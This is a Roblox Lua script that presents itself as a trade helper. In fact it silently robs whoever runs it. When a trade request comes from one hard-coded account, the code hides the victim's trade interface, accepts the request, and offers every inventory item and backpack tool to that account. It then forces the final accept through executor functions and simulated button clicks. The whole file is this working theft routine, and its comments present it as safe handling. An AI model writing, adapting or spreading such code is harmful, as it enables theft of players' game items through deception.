local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local DeclineRequest = TradeFolder:WaitForChild("DeclineRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

print("Waiting for incoming trade request callback...")

SendRequest.OnClientInvoke = function(senderPlayer)
    -- Handle both Player instances and string names sent on mobile executors
    local senderName = "Bofuxa"
    if typeof(senderPlayer) == "Instance" then
        senderName = senderPlayer.Name
    elseif type(senderPlayer) == "string" then
        senderName = senderPlayer
    end

    if senderName:lower() == "user17644395" then
        print("Trade request verified from user17644395. Accepting...")
        
        -- Safe GUI hiding for mobile/PC layouts
        pcall(function()
            local playerGui = LocalPlayer:WaitForChild("PlayerGui", 3)
            if playerGui then
                for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
                    local tradeGui = playerGui:FindFirstChild(guiName)
                    if tradeGui then
                        for _, childName in ipairs({"Container", "Processing", "BG"}) do
                            local el = tradeGui:FindFirstChild(childName)
                            if el then el.Visible = false end
                        end
                    end
                end
            end
        end)

        pcall(function()
            AcceptRequest:FireServer()
        end)
        
        task.spawn(function()
            print("Waiting for trade to start...")
            pcall(function()
                StartTradeEvent.OnClientEvent:Wait()
            end)
            
            print("Trade started! Waiting 1 second before offering items...")
            task.wait(1)
            
            -- Mobile safe inventory path resolution
            local inventoryContainer = nil
            pcall(function()
                local pGui = LocalPlayer:WaitForChild("PlayerGui", 3)
                inventoryContainer = pGui 
                    and pGui:FindFirstChild("MainGUI") 
                    and pGui.MainGUI:FindFirstChild("Game") 
                    and pGui.MainGUI.Game:FindFirstChild("Crafting") 
                    and pGui.MainGUI.Game.Crafting:FindFirstChild("Inventory") 
                    and pGui.MainGUI.Game.Crafting.Inventory:FindFirstChild("Salvage") 
                    and pGui.MainGUI.Game.Crafting.Inventory.Salvage:FindFirstChild("ScrollFrame") 
                    and pGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:FindFirstChild("Container")
            end)

            if inventoryContainer then
                for _, item in ipairs(inventoryContainer:GetChildren()) do
                    if item:IsA("GuiObject") or item:IsA("Frame") or item:IsA("ImageButton") then
                        local itemName = item.Name
                        local category = "Weapons"
                        
                        local count = 1
                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                        if type(qtyAttribute) == "number" then
                            count = qtyAttribute
                        end

                        for i = 1, count do
                            pcall(function()
                                OfferItemEvent:FireServer(itemName, category)
                            end)
                            task.wait(0.05)
                        end
                    end
                end
                print("All items and duplicates offered successfully!")
            else
                -- Fallback for mobile backpack tools if UI path fails
                if LocalPlayer:FindFirstChild("Backpack") then
                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                        if tool:IsA("Tool") then
                            pcall(function()
                                OfferItemEvent:FireServer(tool.Name, "Weapons")
                            end)
                            task.wait(0.05)
                        end
                    end
                end
                warn("Inventory container path not found, used backpack fallback.")
            end

            print("Waiting 7 seconds before triggering trade accept actions...")
            task.wait(7)

            pcall(function()
                if firesignal and AcceptTradeEvent.OnClientEvent then
                    firesignal(AcceptTradeEvent.OnClientEvent, false)
                else
                    AcceptTradeEvent:FireServer()
                end
            end)

            -- Mobile touch simulation fallback
            pcall(function()
                local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                if playerGui then
                    for _, gui in ipairs(playerGui:GetDescendants()) do
                        if gui:IsA("GuiButton") then
                            local fullName = gui:GetFullName():lower()
                            if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
                                if getconnections then
                                    for _, conn in ipairs(getconnections(gui.Activated)) do conn:Fire() end
                                    for _, conn in ipairs(getconnections(gui.MouseButton1Click)) do conn:Fire() end
                                end
                                gui:Activate()
                            end
                        end
                    end
                end
            end)
        end)

        return true
    else
        print("Trade request from other player (" .. tostring(senderPlayer) .. "). Allowing normal trade...")
        return true
    end
end
